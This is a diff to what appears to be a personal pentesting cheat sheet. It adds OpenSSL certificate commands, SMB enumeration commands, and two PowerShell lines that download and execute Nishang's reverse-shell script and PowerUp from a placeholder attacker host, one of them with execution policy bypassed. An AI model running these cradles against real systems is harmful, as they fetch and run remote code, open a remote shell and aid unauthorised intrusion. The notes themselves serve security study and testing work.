@@ -51,3 +51,16 @@ Linux enumerarion help:  https://www.rebootuser.com/?p=1623#.V5QOe7grKUl
 To find S3 bucket of the program, I used nahamsec‘s lazys3.
 Command: ruby lazys3.rb site_name
 https://github.com/ehsahil/recon-my-way/tree/master/lazys3 
+
+Openssl :
+openssl req -x509 -new -nodes -key abc.key -sha256 -days 1024 -out abcd.pem
+openssl req -new -newkey rsa:2048 -nodes -out abc.csr -keyout abcd.key
+openssl pkcs12 -export -in asdf.pem -inkey ca.key -out server.p12 
+
+SMB part:
+smbclient -L //ip   {smb shares}
+smbmap -H ip   
+
+Windows Nishang Rbash like thingy:
+powershell -version 2 -command "IEX(New-Object Net.WebClient).DownloadString('http://:8000/Invoke-PowerShellTcp.ps1')"
+powershell -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.x.x:port/PowerUp.ps1');Invoke-AllChecks"
